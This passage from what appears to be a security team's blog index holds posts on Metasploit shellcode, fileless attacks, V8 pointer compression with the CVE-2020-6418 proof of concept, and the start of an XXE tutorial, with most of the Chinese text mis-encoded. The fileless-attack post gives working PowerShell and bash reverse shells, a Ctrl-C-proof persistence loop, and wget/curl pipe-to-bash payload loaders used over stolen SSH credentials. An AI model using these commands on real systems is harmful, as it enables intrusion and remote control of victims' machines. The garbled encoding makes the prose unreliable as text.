class="line">åŸºäºMacçš„Shellcode</span><br><span class="line"></span><br><span class="line">msfvenom -p osx / x86 / shell_reverse_tcp LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¦è¿æ¥çš„ç«¯å£&gt; -f &lt;è¯­è¨€&gt;</span><br></pre></td></tr></table></figure><blockquote><p>å¯¹äºæ‰€æœ‰shellcodeï¼Œè¯·å‚é˜…â€œ msfvenom â€“hâ€ä»¥è·å–æœ‰å…³æœ‰æ•ˆå‚æ•°çš„ä¿¡æ¯ã€‚Msfvenomå°†è¾“å‡ºèƒ½å¤Ÿä»¥è¿™ç§è¯­è¨€å‰ªåˆ‡å’Œç²˜è´´çš„ä»£ç ï¼Œæ¥ä¾›åˆ©ç”¨ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackerå¿…ä¼šæŠ€èƒ½ï¼</title>
      <link href="2020/09/21/hacker%E5%BF%85%E4%BC%9A%E6%8A%80%E8%83%BD/"/>
      <url>2020/09/21/hacker%E5%BF%85%E4%BC%9A%E6%8A%80%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<blockquote><p>â€œæ— æ–‡ä»¶æ¶æ„è½¯ä»¶æ˜¯ä¸€ç§æ“ä½œåŠå…¶ç®€å•ä½†åˆåŠå…¶å±é™©çš„å¨èƒï¼Œå®ƒèƒ½ä½¿æŸäº›ç½‘ç»œé˜²å¾¡æ— æ•ˆã€‚â€</p></blockquote><h1 id="èƒŒæ™¯èµ„æ–™ï¼š"><a href="#èƒŒæ™¯èµ„æ–™ï¼š" class="headerlink" title="èƒŒæ™¯èµ„æ–™ï¼š"></a>èƒŒæ™¯èµ„æ–™ï¼š</h1><p>ç½‘ç»œå®‰å…¨å…¬å¸CrowdStrikeå‘å¸ƒäº†ã€Š2020å…¨çƒå¨èƒæ€åŠ¿æŠ¥å‘Šã€‹ï¼Œå…¶ç ”ç©¶ç»“æœæ˜¾ç¤ºâ€œæ— æ–‡ä»¶æ¶æ„è½¯ä»¶â€æ”»å‡»çš„è¶‹åŠ¿å¢åŠ ï¼Œæ— æ–‡ä»¶æ¶æ„è½¯ä»¶çš„æ”»å‡»æ•°é‡è¶…è¿‡äº†æ¶æ„è½¯ä»¶çš„æ”»å‡»æ•°é‡ã€‚2019å¹´ï¼Œ51ï¼…çš„æ”»å‡»ä½¿ç”¨äº†æ— æ–‡ä»¶æ¶æ„è½¯ä»¶æŠ€æœ¯ï¼Œè€Œåœ¨2018å¹´ï¼Œåªæœ‰40ï¼…çš„æ”»å‡»ä½¿ç”¨äº†æ— æ–‡ä»¶æ¶æ„è½¯ä»¶æŠ€æœ¯ã€‚</p><blockquote><p>â€œå¯ä»¥çœ‹åˆ°æ— æ–‡ä»¶æ¶æ„è½¯ä»¶æ”»å‡»å°†ä¼šæˆä¸ºä»¥åä¸»æµæ”»å‡»æ‰‹æ®µï¼Œè¿™ä¹Ÿè®©é˜²å¾¡æ–¹æ›´åŠ å¤´ç–¼ï¼â€</p></blockquote><h1 id="ä¼˜ç‚¹ï¼š"><a href="#ä¼˜ç‚¹ï¼š" class="headerlink" title="ä¼˜ç‚¹ï¼š"></a>ä¼˜ç‚¹ï¼š</h1><p>æ¶æ„è½¯ä»¶æ”»å‡»å®šä¹‰ä¸ºï¼šæœ‰æ¶æ„æ–‡ä»¶è¢«å†™å…¥ç£ç›˜ï¼Œå¯¼è‡´ä¼šè¢«é˜²æŠ¤äº§å“æ£€æµ‹åˆ°è¯•å›¾è¿è¡Œè¯¥æ–‡ä»¶ï¼Œç„¶åè¯†åˆ«æˆ–é˜»æ­¢å®ƒï¼Œè¿™äº›å…¥ä¾µå°è¯•ç›¸å¯¹æ¥è¯´æ¯”è¾ƒå®¹æ˜“æ‹¦æˆªå’Œé˜»æ­¢ï¼Œé€šå¸¸å¯ä»¥ç”¨ä¼ ç»Ÿçš„åæ¶æ„è½¯ä»¶è§£å†³æ–¹æ¡ˆæœ‰æ•ˆåœ°é˜»æ­¢ã€‚<br>æ¶æ„è½¯ä»¶æ”»å‡»å®šä¹‰ä¸ºï¼šåˆå§‹æ²¡æœ‰æ–‡ä»¶æˆ–æ–‡ä»¶ç‰‡æ®µè¢«å†™å…¥ç£ç›˜çš„æ”»å‡»ï¼Œä¾‹å¦‚åŒ…æ‹¬ä»£ç ä»å†…å­˜æ‰§è¡Œçš„æ”»å‡»ã€æˆ–è€…åˆ©ç”¨ç›—å–çš„å‡­è¯ä½¿ç”¨å·²çŸ¥å·¥å…·è¿›è¡Œè¿œç¨‹ç™»å½•çš„æ”»å‡»ï¼Œéœ€è¦æ›´å¹¿æ³›æ›´å¤æ‚çš„æ£€æµ‹æŠ€æœ¯æ¥å¯é åœ°è¯†åˆ«å’Œæ‹¦æˆªï¼ŒåŒ…æ‹¬è¡Œä¸ºæ£€æµ‹å’Œäººç±»å¨èƒæ•è·ä½†æ˜¯ä»€ä¹ˆæ˜¯æ— æ–‡ä»¶æ¶æ„è½¯ä»¶ã€‚</p><blockquote><p>â€œå¯ä»¥çœ‹åˆ°æ— æ–‡ä»¶æ¶æ„è½¯ä»¶æ”»å‡»æœ€å¤§çš„ä¼˜ç‚¹æ˜¯ï¼Œä¸€æ¬¡æ”»å‡»å°†ä¸ä¼šå†æ‰§è¡Œçš„.exeæˆ–ç±»ä¼¼çš„ä¸œè¥¿ï¼Œè€Œæ˜¯ç›´æ¥ARMè¿è¡Œæœ‰æ•ˆè½½è·ï¼â€</p></blockquote><h1 id="Powershellç¤ºä¾‹ï¼š"><a href="#Powershellç¤ºä¾‹ï¼š" class="headerlink" title="Powershellç¤ºä¾‹ï¼š"></a>Powershellç¤ºä¾‹ï¼š</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -c &quot;$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.0.0.1&#39;,4242);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure><p>æ­¤powershellå‘½ä»¤æ˜¯åå‘TCP Shellã€‚ä»æŠ€æœ¯ä¸Šè®²ï¼Œå®ƒåœ¨å±äºæ— æ–‡ä»¶æ¶æ„è½¯ä»¶èŒƒç•´ã€‚å®ƒå¯ä»¥ç›´æ¥ä»å‘½ä»¤è¡Œæˆ–é€šè¿‡æ¼æ´åˆ©ç”¨æ‰§è¡Œï¼ŒåŠŸèƒ½å’Œæ¶æ„è½¯ä»¶æ— ç–‘ï¼ŒOf course! è¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥è¿è¡Œä»£ç ã€‚è¿™ç§å°å·§çš„Powershellæ˜¯éå¸¸niceï¼çš„ï¼Œé˜²ç—…æ¯’äº§å“æ²¡æœ‰æœºä¼šæ‰«ææ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç ï¼Œå› ä¸ºæ²¡æœ‰æ–‡ä»¶å¯æ‰«æã€‚é™¤å¤–ï¼Œå®ƒè¿˜éå¸¸æ˜“äºä¿®æ”¹ï¼Œæ··æ·†å’Œæ·»åŠ åŠŸèƒ½ã€‚</p><h1 id="å®æˆ˜åº”ç”¨ï¼š"><a href="#å®æˆ˜åº”ç”¨ï¼š" class="headerlink" title="å®æˆ˜åº”ç”¨ï¼š"></a>å®æˆ˜åº”ç”¨ï¼š</h1><p>å‡å¦‚æˆ‘ä»¬å½“å‰è·å¾—äº†ä¸€ä¸ªsshè¿æ¥ç”¨æˆ·testçš„ç”¨æˆ·å‡­è¯ï¼ˆå£ä»¤ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿™æ ·åš<br>é¦–å…ˆåœ¨æˆ‘ä»¬æ”»å‡»ç›‘å¬ä¸€ä¸ªç«¯å£ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvk 8888</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†åœ¨è¢«æ”»å‡»çš„ä¸»æœºä¸Šæ‰§è¡Œåå‘shellç¨‹åºã€‚åœ¨æ”»å‡»æœºè¾“å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh test@compromised.host &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&lt;yourIP&gt;&#x2F;&lt;yourPort&gt; 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™ä½ å°†æˆåŠŸè·å¾—ä¸€ä¸ªåå‘shellè¿æ¥ï¼</p><h5 id="å†è¿›ä¸€æ­¥ï¼š"><a href="#å†è¿›ä¸€æ­¥ï¼š" class="headerlink" title="å†è¿›ä¸€æ­¥ï¼š"></a>å†è¿›ä¸€æ­¥ï¼š</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">trap &quot;:&quot; SIGINT SIGHUP</span><br><span class="line">while True; do</span><br><span class="line">    bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br><span class="line">    sleep 30</span><br><span class="line">Done</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªshellè„šæœ¬å°†30ç§’ä¸ºæˆ‘ä»¬æ‰§è¡Œä¸€æ¬¡æœ‰æ•ˆè´Ÿè½½ï¼Œä¸”å±è”½SIGINTä¿¡å·ï¼Œé‚£ä¹ˆCtrl+Cä¹Ÿæ— æ³•æ€æ­»ï¼</p><blockquote><p>â€œSIGINTä¿¡æ¯ï¼šç¨‹åºç»ˆæ­¢(interrupt)ä¿¡å·, åœ¨ç”¨æˆ·é”®å…¥INTRå­—ç¬¦(é€šå¸¸æ˜¯Ctrl-C)æ—¶å‘å‡ºï¼Œç”¨äºé€šçŸ¥å‰å°è¿›ç¨‹ç»„ç»ˆæ­¢è¿›ç¨‹ã€‚â€</p></blockquote><p>é‚£ä¹ˆä½ ä¼šé—®è¿™ä¸å°±æ˜¯ä¸€ä¸ªshellè„šæœ¬ï¼Œä¸€æ ·ä¼šå†™å…¥ç£ç›˜å•Šï¼Œä¸€æ ·ä¼šè¢«å‘ç°çš„ï¼<br>å½“ç„¶ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥æ‰æ˜¯é‡ç‚¹ï¼šå„ä½çœ‹å®˜è¯·çœ‹<br>ç¬¬ä¸€æ­¥ä¼˜åŒ–ï¼šï¼ˆç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼‰æŠŠshè„šæœ¬ä¿å­˜ä¸ºtest.shæ”¾åœ¨æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ä¸Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis wget &amp;&amp; (wget -O - http:&#x2F;&#x2F;ip:8888&#x2F;test.sh | bash &amp;) || whereis curl &amp;&amp; (curl -o - http:&#x2F;&#x2F;localhost:8888&#x2F;test.sh | bash &amp;)</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥ä¼˜åŒ–ï¼Œå½“ç„¶å‰é¢é‚£æ ·è¿˜æ˜¯ä¼šç•™ä¸‹äº›è®¸ç—•è¿¹ï¼é‚£ä¹ˆè¿™æ ·å‹’ï¼Ÿ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh test@compromised.host &quot;whereis wget &amp;&amp; (wget -O - http:&#x2F;&#x2F;localhost:8888&#x2F;test.sh | bash &amp;) || whereis curl &amp;&amp; (curl -o - http:&#x2F;&#x2F;localhost:8888&#x2F;test.sh | bash &amp;)&quot;</span><br></pre></td></tr></table></figure><p>ä»å‘½ä»¤çš„å¤æ‚ç¨‹åº¦æ¥çœ‹ï¼Œæ˜¯éå¸¸ç®€å•çš„ï¼Œä½†æ˜¯å®ƒä»æ¥æ²¡æœ‰ç¢°è¿‡ç£ç›˜ã€‚è¿™ç§æ— æ–‡ä»¶æ”»å‡»çš„å¼Šç«¯å°±æ˜¯ä¸€æ–­ç”µé‡å¯å°±å“¦è±äº†ï¼å› ä¸ºä»£ç é©»ç•™åœ¨å†…å­˜ä¸­è¿è¡Œï¼Œå½“ç„¶è¿™ä¸æ¯«ä¸å½±å“å®ƒæˆä¸ºé»‘å®¢æ”»å‡»çš„</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…æ·¡v8æŒ‡é’ˆå‹ç¼©</title>
      <link href="2020/09/21/%E6%B5%85%E6%B7%A1v8%E6%8C%87%E9%92%88%E5%8E%8B%E7%BC%A9/"/>
      <url>2020/09/21/%E6%B5%85%E6%B7%A1v8%E6%8C%87%E9%92%88%E5%8E%8B%E7%BC%A9/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Pointer compressionæ˜¯v8 8.0ä¸­ä¸ºæé«˜64ä½æœºå™¨å†…å­˜åˆ©ç”¨ç‡è€Œå¼•å…¥çš„æœºåˆ¶ã€‚</p></blockquote><h2 id="ä»€ä¹ˆæ˜¯Pointer-compression"><a href="#ä»€ä¹ˆæ˜¯Pointer-compression" class="headerlink" title="ä»€ä¹ˆæ˜¯Pointer compression"></a>ä»€ä¹ˆæ˜¯Pointer compression</h2><p>å¯¹äºsmiï¼Œåœ¨ä¹‹å‰çš„64ä½ç³»ç»Ÿä¸­çš„è¡¨ç¤ºæ˜¯<code>value &lt;&lt; 32</code>ï¼Œç°åœ¨å˜æˆ<code>value &lt;&lt; 1</code>ï¼ˆç•™ä¸€ä½åš[pointer tagging]ï¼‰ï¼Œè¿™æ ·smiä»64ä½å˜ä¸º32ä½ã€‚</p><blockquote><p>â€œè¯¦æƒ…è¯·å‚è€ƒï¼š<a href="https://en.wikipedia.org/wiki/Tagged_pointer%E2%80%9D">https://en.wikipedia.org/wiki/Tagged_pointerâ€</a></p></blockquote><p>å¯¹äºv8ä¸­64ä½çš„å¯¹è±¡æŒ‡é’ˆï¼Œå®ƒä»¬çš„é«˜32ä½åŸºæœ¬æ˜¯ä¸å˜çš„ï¼ŒèŠ±è´¹4å­—èŠ‚æ¥å‚¨å­˜å®ƒä»¬ä¼šæµªè´¹å†…å­˜ç©ºé—´ï¼›æ‰€ä»¥æŒ‡é’ˆå‹ç¼©å°†64ä½å¯¹è±¡æŒ‡é’ˆå˜ä¸º32ä½ï¼Œä¹Ÿå°±æ˜¯64ä½æŒ‡é’ˆä¸­çš„ä½32ä½ï¼Œå°†64ä½æŒ‡é’ˆçš„é«˜32ä½ä¿å­˜åœ¨r13ä¸­ï¼›è®¿é—®å¯¹è±¡æ—¶ï¼Œåªéœ€è¦å°†å¯¹è±¡æŒ‡é’ˆä¸æ ¹å¯„å­˜å™¨çš„åŸºå€ç›¸åŠ å³å¯å¾—åˆ°å®Œæ•´åœ°å€ã€‚</p><h2 id="v8å…³äºæŒ‡é’ˆå‹ç¼©çš„å®ç°"><a href="#v8å…³äºæŒ‡é’ˆå‹ç¼©çš„å®ç°" class="headerlink" title="v8å…³äºæŒ‡é’ˆå‹ç¼©çš„å®ç°"></a>v8å…³äºæŒ‡é’ˆå‹ç¼©çš„å®ç°</h2><p>é¦–å…ˆæˆ‘ä»¬èƒ½æƒ³åˆ°çš„å®ç°æ–¹å¼æ˜¯ä»0åœ°å€å¼€å§‹åˆ†é…4Gå†…å­˜ï¼Œç¡®ä¿v8å¯¹è±¡åˆ†é…åœ¨è¿™4Gå†…å­˜èŒƒå›´å†…ï¼›v8æ˜¾ç„¶æ²¡æœ‰è¿™æ ·åšï¼Œåœ¨chromeæ¸²æŸ“è¿›ç¨‹ä¸­å¯èƒ½ä¼šæœ‰å¤šä¸ªv8å®ä¾‹ï¼Œè¿™ä¸ªæ–¹æ¡ˆä¼šå¯¼è‡´æ‰€æœ‰v8å®ä¾‹éƒ½æ¥ç«äº‰è¿™4Gå†…å­˜ï¼Œ<del>è€Œæˆ‘ä»¬ç¨å¾®å¼€ä¸¤ä¸ªchromeå†…å­˜å°±åƒæ»¡äº†</del>ã€‚</p><blockquote><p>â€œè¯¦æƒ…è¯·å‚è€ƒï¼š<a href="https://v8.dev/blog/pointer-compression%E2%80%9D">https://v8.dev/blog/pointer-compressionâ€</a></p></blockquote><h2 id="æŒ‡é’ˆå‹ç¼©åœ¨v8æ¼æ´åˆ©ç”¨ä¸­çš„å½±å“"><a href="#æŒ‡é’ˆå‹ç¼©åœ¨v8æ¼æ´åˆ©ç”¨ä¸­çš„å½±å“" class="headerlink" title="æŒ‡é’ˆå‹ç¼©åœ¨v8æ¼æ´åˆ©ç”¨ä¸­çš„å½±å“"></a>æŒ‡é’ˆå‹ç¼©åœ¨v8æ¼æ´åˆ©ç”¨ä¸­çš„å½±å“</h2><p>é¦–å…ˆæˆ‘ä»¬å¾ˆéš¾æ³„æ¼v8å †å†…å­˜ç©ºé—´çš„é«˜32ä½ï¼ˆr13å¯„å­˜å™¨ï¼‰ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬ç”¨ä¼ªé€ JSArrayå¹¶æ§åˆ¶elementsæŒ‡é’ˆä»¥è·å–ä»»æ„r/wåŸè¯­çš„æ—¶å€™åªèƒ½åœ¨4Gçš„å †å†…è¿›è¡Œã€‚</p><p>æƒ³è¦ä»»æ„r/wåŸè¯­æˆ‘ä»¬å¯ä»¥åœ¨v8å †ä¸Šåˆ†é…ArrayBufferå¹¶è¦†ç›–å®ƒçš„backing_storeåˆ°ä»»æ„64ä½å†…å­˜åœ°å€ï¼Œç„¶åç”¨TypedArrayæˆ–DataViewå¯¹è±¡æ‹¿åˆ°æ•´ä¸ª64ä½åœ°å€ç©ºé—´å†…çš„ä»»æ„r/wåŸè¯­ã€‚åŸå› æ˜¯backing_storeä½¿ç”¨<a href="https://chromium.googlesource.com/chromium/src/+/dcc13470a/third_party/WebKit/Source/wtf/PartitionAlloc.md">PartitionAlloc</a>åˆ†é…ï¼Œæ‰€æœ‰PartitionAllocåˆ†é…çš„å†…å­˜éƒ½ä½äºv8å †ä¹‹å¤–çš„å•ç‹¬å†…å­˜åŒºåŸŸä¸­ï¼Œæ‰€ä»¥æ²¡æœ‰æŒ‡é’ˆå‹ç¼©ã€‚</p><p>è¿˜æœ‰BigUint64Arrayå¯¹è±¡ï¼Œåˆ©ç”¨å®ƒä¹Ÿå¯ä»¥å®ç°v8å †å†…ã€å †å¤–ä»»æ„r/wï¼›è§‚å¯Ÿä¸€ä¸‹BigUint64Arrayå¯¹è±¡çš„å†…å­˜å¸ƒå±€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sh</span><br><span class="line">DebugPrint: 0x192a080c5ed1: [JSTypedArray]</span><br><span class="line"> - map: 0x192a08280671 &lt;Map(BIGUINT64ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x192a08242db1 &lt;Object map &#x3D; 0x192a08280699&gt;</span><br><span class="line"> - elements: 0x192a080c5eb9 &lt;ByteArray[16]&gt; [BIGUINT64ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - buffer: 0x192a080c5e81 &lt;ArrayBuffer map &#x3D; 0x192a08281189&gt;</span><br><span class="line"> - byte_offset: 0</span><br><span class="line"> - byte_length: 16</span><br><span class="line"> - length: 2</span><br><span class="line"> - data_ptr: 0x192a080c5ec0</span><br><span class="line">   - base_pointer: 0x80c5eb9</span><br><span class="line">   - external_pointer: 0x192a00000007</span><br><span class="line"> - properties: 0x192a080406e9 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"> - elements: 0x192a080c5eb9 &lt;ByteArray[16]&gt; &#123;</span><br><span class="line">         0-1: 1311768465173141112</span><br><span class="line"> &#125;</span><br><span class="line"> - embedder fields &#x3D; &#123;</span><br><span class="line">0, aligned pointer: 0x0</span><br><span class="line">0, aligned pointer: 0x0</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°external_pointerè·Ÿbase_pointeréƒ½æ˜¯æ²¡æœ‰è¿›è¡ŒæŒ‡é’ˆå‹ç¼©çš„64ä½æŒ‡é’ˆï¼Œå¹¶ä¸”data_ptræ˜¯å®ƒä¿©ç›¸åŠ ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†ç›–external_pointerå’Œbase_pointerå®ç°64ä½å†…å­˜ç©ºé—´ä»»æ„r/wï¼›è¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯åˆå§‹æ—¶external_pointeræŒ‡é’ˆåˆšå¥½æ˜¯r13å¯„å­˜å™¨çš„é«˜32ä½ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ³„éœ²external_pointeræ¥è·å¾—v8å †çš„åŸºå€ï¼ˆè™½ç„¶å¥½åƒä¹Ÿæ²¡æœ‰ä»€ä¹ˆç”¨ï¼‰ã€‚</p><p>åœ¨ç±»å‹æ··æ·†æ¼æ´çš„åˆ©ç”¨ä¸­ï¼Œå½“ä¸€ä¸ªæ•°ç»„ä»smi/objectè½¬ä¸ºdoubleçš„æ—¶å€™ï¼Œå ç”¨ç©ºé—´ä¼šç¿»å€ï¼Œåä¹‹ä¼šå‡åŠã€‚</p><h2 id="CVE-2020-6418"><a href="#CVE-2020-6418" class="headerlink" title="CVE-2020-6418"></a>CVE-2020-6418</h2><p>è¿™ä¸ªæ´ä¹Ÿæ˜¯2020-SCTFæµè§ˆå™¨é¢˜EasyMojoçš„v8éƒ¨åˆ†ã€‚</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">js</span><br><span class="line">&#x2F;&#x2F; Copyright 2020 the V8 project authors. All rights reserved.</span><br><span class="line">&#x2F;&#x2F; Use of this source code is governed by a BSD-style license that can be</span><br><span class="line">&#x2F;&#x2F; found in the LICENSE file.</span><br><span class="line">&#x2F;&#x2F; Flags: --allow-natives-syntax</span><br><span class="line">let a &#x3D; [0, 1, 2, 3, 4];</span><br><span class="line"></span><br><span class="line">function empty() &#123;&#125;</span><br><span class="line"></span><br><span class="line">function f(p) &#123;</span><br><span class="line">  a.pop(Reflect.construct(empty, arguments, p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let p &#x3D; new Proxy(Object, &#123;</span><br><span class="line">    get: () &#x3D;&gt; (a[0] &#x3D; 1.1, Object.prototype)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function main(p) &#123;</span><br><span class="line">  f(p);</span><br><span class="line">&#125;</span><br><span class="line">%PrepareFunctionForOptimization(empty);</span><br><span class="line">%PrepareFunctionForOptimization(f);</span><br><span class="line">%PrepareFunctionForOptimization(main);</span><br><span class="line">main(empty);</span><br><span class="line">main(empty);</span><br><span class="line">%OptimizeFunctionOnNextCall(main);</span><br><span class="line">main(p);</span><br></pre></td></tr></table></figure><p>jitæ²¡æœ‰è€ƒè™‘åˆ°aæœ‰side effectä¼šå˜ä¸ºdoubleç±»å‹æ•°ç»„ï¼Œä»æŒ‰smiå¤„ç†ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>è€ƒè™‘åˆ°æŒ‡é’ˆå‹ç¼©ï¼Œæˆ‘ä»¬åŸºæœ¬åˆ©ç”¨æ€è·¯å°±æœ‰äº†ï¼š<br>1.åˆ©ç”¨ç±»å‹æ··æ·†æŠŠdoubleæ•°ç»„å˜ä¸ºobjectæ•°ç»„ï¼›<br>2.è¶Šç•Œè¯»å†™ä¿®æ”¹å¸ƒç½®åœ¨åé¢çš„doubleæ•°ç»„çš„lengthå­—æ®µï¼›<br>3.æœ‰äº†ä»»æ„é•¿åº¦è¶Šç•Œçš„doubleæ•°ç»„ï¼Œå†æ‰¾åˆ°å¸ƒç½®åœ¨åé¢çš„BigUint64Arrayï¼Œé€šè¿‡è¶Šç•Œå†™è¦†ç›–BigUint64Arrayçš„base_pointerå’Œexternal_poinerå­—æ®µæ¥å®ç°ä»»æ„r/wåŸè¯­ï¼›<br>4.åˆ©ç”¨ä»»æ„r/wåŸè¯­æ„é€ addrOfåŸè¯­å’ŒfakeObjåŸè¯­ï¼›<br>5.å‘wasmçš„rwxå†…å­˜å†™å…¥shellcodeï¼›</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å‚è€ƒé“¾æ¥</span><br><span class="line">1.&lt;https:&#x2F;&#x2F;v8.dev&#x2F;blog&#x2F;pointer-compression&gt;</span><br><span class="line">2.&lt;https:&#x2F;&#x2F;blog.infosectcbr.com.au&#x2F;2020&#x2F;02&#x2F;pointer-compression-in-v8.html&gt;</span><br><span class="line">3.&lt;https:&#x2F;&#x2F;ray-cp.github.io&#x2F;archivers&#x2F;browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€æ–‡å­¦æ‡‚XXEæ¼æ´ï¼Œä»0åˆ°1</title>
      <link href="2020/09/20/%E4%B8%80%E6%96%87%E5%AD%A6%E6%87%82XXE%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%8E0%E5%88%B01/"/>
      <url>2020/09/20/%E4%B8%80%E6%96%87%E5%AD%A6%E6%87%82XXE%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%8E0%E5%88%B01/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€é˜¶æ®µï¼ˆæµ…è°ˆXMLï¼‰"><a href="#ç¬¬ä¸€é˜¶æ®µï¼ˆæµ…è°ˆXMLï¼‰" class="headerlink" title="ç¬¬ä¸€é˜¶æ®µï¼ˆæµ…è°ˆXMLï¼‰"></a>ç¬¬ä¸€é˜¶æ®µï¼ˆæµ…è°ˆXMLï¼‰</h1><h2 id="åˆè¯†XML"><a href="#åˆè¯†XML" class="headerlink" title="åˆè¯†XML"></a>åˆè¯†XML</h2><p>ä¸€ä¸ªå¥½çš„ä»£ç åŸºç¡€èƒ½å¸®åŠ©ä½ æ›´å¥½ç†è§£ä¸€ç±»æ¼æ´ï¼Œæ‰€ä»¥å…ˆå­¦ä¹ ä¸€ä¸‹XMLçš„åŸºç¡€çŸ¥è¯†ã€‚<br>XMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ï¼Œå…¶æŠŠæ•°æ®ä»HTMLåˆ†ç¦»ï¼Œæ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ï¼Œç®€å•æ¥è¯´XMLä¸»è¦æ˜¯é¢å‘ä¼ è¾“çš„ã€‚</p><p>ä»€ä¹ˆæ˜¯XMLï¼Ÿ<br>XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰<br>XML 